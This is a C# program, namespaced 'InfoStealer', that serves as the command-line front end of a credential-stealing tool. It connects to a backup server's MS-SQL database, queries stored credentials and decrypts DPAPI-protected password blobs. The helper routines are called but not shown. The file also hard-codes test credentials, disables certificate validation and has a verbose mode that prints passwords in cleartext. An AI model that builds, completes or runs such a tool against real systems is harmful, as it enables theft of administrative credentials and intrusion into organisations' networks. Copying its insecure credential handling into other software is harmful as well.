using System;
using System.Reflection.PortableExecutable;
using Microsoft.Data.SqlClient;

// https://learn.microsoft.com/en-us/azure/azure-sql/database/connect-query-dotnet-core?view=azuresql

namespace InfoStealer 
{
    internal class Program
    {
        private static int Main(string[] args)
        {
            try
            {
                SqlConnectionStringBuilder builder = new SqlConnectionStringBuilder();

                builder.InitialCatalog = "NetbnmBackup"; // The database to be queried
                builder.Encrypt = true;
                builder.TrustServerCertificate = true;

                // CLI parsing is hacky, but we don't have to use a 3rd party arg parsing lib this way.
                if (args.Contains("-h") || args.Length == 0 || args.Length < 4 && args[0] != "string" || args[0] == "string" && args.Length > 2) // print help then quit.
                {
                    Console.WriteLine("[help] sqlsharp.exe <type> <SQL Database Source> username password");
                    Console.WriteLine("\t Ex: sqlsharp.exe dpapi localhost veemadmin Password*");
                    Console.WriteLine("\t Ex: sqlsharp.exe string <base64 encoded dpapi blob>");
                    Console.WriteLine("\t type: base64, dpapi, string; (a string is a base64 encoded dpapi blob passed directly in)");
                    return 0;
                }
                if (args[0] == "string")
                {
                    // decrypt DPAPI credenials
                    dpapi.DPAPI_decrypt(args[1]);
                }
                else
                {
                    if (args.Length >= 4) // if user has provided arguments then populate the SQL connection w/ said args
                    {
                        //builder.DataType = args[0];         // How the password is stroed in the Database
                        builder.DataSource = args[1];       // IP/hostname of MS-SQL server
                        builder.UserID = args[2];           // username (*note, errors will occur if the user does not have read access to the table that's being queried*)
                        builder.Password = args[3];         // password to authenticate with


                        // hacky-way to verbosely print args but -v must be the last argument
                        // this avoids having to download and import a 3rd party library for arg parsing.
                        if (args.Contains("-v"))
                        {
                            Console.WriteLine("[DEBUG] Connect to: " + args[1] + " Username: " + args[2] + " Pass is: " + args[3]);
                        }

                    }
                    else
                    { // hard coded creds for testing local instance of MS-SQL
                        builder.DataSource = "localhost";
                        builder.UserID = "veeamadmin";
                        builder.Password = "Password*";
                    }

                    // Perform MSSQL query
                    mssql.cred_query(builder, args[0]);
                }
                

            }
            catch (SqlException e)
            {
                Console.WriteLine("Error connecting to SQL server: " + e.Message.ToString());
                return 1;
            }

            return 0;
        }
    }
}
